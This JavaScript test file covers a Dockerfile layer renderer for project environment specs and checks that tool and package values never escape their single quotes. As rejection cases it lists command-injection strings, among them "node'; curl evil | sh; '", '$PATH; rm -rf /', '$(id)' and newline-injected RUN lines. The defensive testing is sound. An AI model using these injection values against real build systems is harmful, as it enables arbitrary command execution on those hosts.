// test/exec-env-spec-dockerfile.test.mjs — the backend-neutral spec renderer (src/core/exec-env/spec-dockerfile.mjs):
// deterministic, strict, and no value ever leaves its single quotes or starts a new instruction.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { normalizeEnvSpec } from '../src/core/exec-env/env-spec.mjs';
import {
  renderSpecLayers, shellWord, SpecDockerfileError, MISE_VERSION, MISE_SHA256, MISE_ROOT,
} from '../src/core/exec-env/spec-dockerfile.mjs';

const spec = (tools = [], apt = []) => normalizeEnvSpec({ tools, apt });
const INSTRUCTION = /^(?:# |RUN |ENV )/;

test('an empty spec renders its marker comment only', () => {
  const s = spec();
  assert.deepEqual(renderSpecLayers(s), [`# worca: project environment ${s.hash}`]);
});

test('apt first, then mise (pinned and checksummed), then the tools, each single-quoted', () => {
  const s = spec([{ name: 'python', version: '3.13.1' }, { name: 'node', version: '24.21.0' }], ['libpq-dev', 'g++']);
  const lines = renderSpecLayers(s);
  assert.equal(lines.length, 5);
  assert.match(lines[0], /^# worca: project environment sha256:[0-9a-f]{64}$/);
  assert.match(lines[1], /^RUN apt-get update \\\n && apt-get install -y --no-install-recommends 'g\+\+' 'libpq-dev' \\\n && rm -rf \/var\/lib\/apt\/lists\/\*$/);
  assert.ok(lines[2].includes(`/v${MISE_VERSION}/mise-v${MISE_VERSION}-linux-$a`));
  assert.ok(lines[2].includes(MISE_SHA256.x64) && lines[2].includes(MISE_SHA256.arm64));
  assert.match(lines[2], /sha256sum -c -/, 'the binary is verified, never piped into a shell');
  assert.equal(lines[3], `ENV MISE_DATA_DIR=${MISE_ROOT} MISE_CONFIG_DIR=${MISE_ROOT}/config PATH=${MISE_ROOT}/shims:$PATH`);
  assert.match(lines[4], /^RUN mise use --global 'node@24\.21\.0' 'python@3\.13\.1' \\\n/, 'sorted by name');
  assert.match(lines[4], /> \/etc\/profile\.d\/mise\.sh/);
  assert.match(lines[4], /chmod -R a\+rX \/opt\/mise$/);
});

test('deterministic: the same spec renders the same text, whatever order it came in', () => {
  const a = spec([{ name: 'b', version: '1.0.0' }, { name: 'a', version: '2.0.0' }], ['zlib1g-dev', 'curl']);
  const b = spec([{ name: 'a', version: '2.0.0' }, { name: 'b', version: '1.0.0' }], ['curl', 'zlib1g-dev', 'curl']);
  assert.deepEqual(renderSpecLayers(a), renderSpecLayers(b));
});

test('a literal PATH tail for builders that do not expand ENV; anything else is refused', () => {
  const s = spec([{ name: 'node', version: '24.21.0' }]);
  assert.match(renderSpecLayers(s, { pathTail: '/usr/local/bin:/usr/bin:/bin' })[2], /PATH=\/opt\/mise\/shims:\/usr\/local\/bin:\/usr\/bin:\/bin$/);
  for (const bad of ['$PATH; rm -rf /', 'relative/bin', '/usr/bin\nRUN id', '/a:$(id)', '']) {
    assert.throws(() => renderSpecLayers(s, { pathTail: bad }), SpecDockerfileError, JSON.stringify(bad));
  }
});

test('hostile-looking values the spec accepts stay inside one quoted word', () => {
  const edge = [
    { name: 'npm:@acme/cli', version: '1.0.0-rc.1' },
    { name: 'github:acme/tools', version: '2026.1.1+build.7' },
    { name: 'pipx:a.b-c_d', version: 'v1' },
    { name: 'ubi:acme/x..y', version: '0' },
    { name: 'cargo:a+b', version: '1.2.3' },
    { name: 'aqua:acme/very/deep/path', version: 'A-1.0_x' },
  ];
  const s = spec(edge, ['libstdc++6', 'a0', 'x.y-z+1']);
  const lines = renderSpecLayers(s);
  const text = lines.join('\n');
  for (const t of s.tools) assert.ok(text.includes(` ${shellWord(`${t.name}@${t.version}`)}`), t.name);
  for (const p of s.apt) assert.ok(text.includes(` '${p}'`), p);
  // Every physical line is an instruction or a ` && ` continuation of the one before.
  for (const l of text.split('\n')) assert.ok(INSTRUCTION.test(l) || l.startsWith(' && '), `stray line: ${l}`);
  const words = /^RUN mise use --global (.*?) \\$/m.exec(text)[1].split(' ');
  for (const w of words) assert.match(w, /^'[A-Za-z0-9._/:@+-]+'$/);
});

test('random values from the accepted alphabets never escape their quotes', () => {
  const nameChars = 'abcXYZ019._/:@+-'; const verChars = 'abcXYZ019._+-'; const aptChars = 'abz09+.-';
  let seed = 7;
  const rnd = (n) => { seed = (seed * 1103515245 + 12345) % 2147483648; return seed % n; };
  const word = (first, rest, max) => first[rnd(first.length)] + Array.from({ length: rnd(max) }, () => rest[rnd(rest.length)]).join('');
  for (let round = 0; round < 50; round++) {
    const tools = new Map();
    for (let i = 0; i < 5; i++) tools.set(word('aZ0', nameChars, 20), word('aZ0', verChars, 12));
    const apt = Array.from({ length: 4 }, () => word('a0', aptChars, 10) + 'x');
    const s = spec([...tools].filter(([, v]) => v !== 'latest').map(([name, version]) => ({ name, version })), apt);
    const text = renderSpecLayers(s).join('\n');
    for (const l of text.split('\n')) assert.ok(INSTRUCTION.test(l) || l.startsWith(' && '), l);
    // With every quoted word blanked, the text is the fixed template: nothing else got in.
    const ref = spec(s.tools.map((_, i) => ({ name: `t${i}`, version: '1' })), s.apt.map((_, i) => `p${i}x`));
    const blank = (t) => t.replace(/'[^'\n]*'/g, "''").replace(/sha256:[0-9a-f]{64}/, 'H');
    assert.equal(blank(text), blank(renderSpecLayers(ref).join('\n')), 'nothing outside quotes but the fixed text');
  }
});

test('values a spec would refuse are refused here too, before any line is written', () => {
  const s = spec([{ name: 'node', version: '24.21.0' }], ['curl']);
  const forged = (patch) => ({ ...s, ...patch });
  const bad = [
    forged({ tools: [{ name: "node'; curl evil | sh; '", version: '1' }] }),
    forged({ tools: [{ name: 'node', version: '1\nRUN id' }] }),
    forged({ tools: [{ name: '-rf', version: '1' }] }),
    forged({ tools: [{ name: 'node', version: 'latest' }] }),
    forged({ tools: [{ name: 'node', version: '$(id)' }] }),
    forged({ tools: [{ name: 'a b', version: '1' }] }),
    forged({ tools: [{ name: 'node', version: '1', extra: 'x' }] }),
    forged({ apt: ['curl; id'] }),
    forged({ apt: ['--allow-unauthenticated'] }),
    forged({ apt: ['Curl'] }),
    forged({ hash: `${s.hash}\nRUN id` }),
    forged({ hash: 'sha256:nothex' }),
    forged({ secret: 'x' }) && { ...s, tools: [{ name: 'python', version: '3.13.1' }] },   // content changed, hash kept
    null,
    'node@1',
  ];
  for (const b of bad) assert.throws(() => renderSpecLayers(b), SpecDockerfileError, JSON.stringify(b));
});

test('shellWord quotes a single quote safely even though no rule lets one through', () => {
  assert.equal(shellWord("a'b"), "'a'\\''b'");
  assert.equal(shellWord('plain'), "'plain'");
});
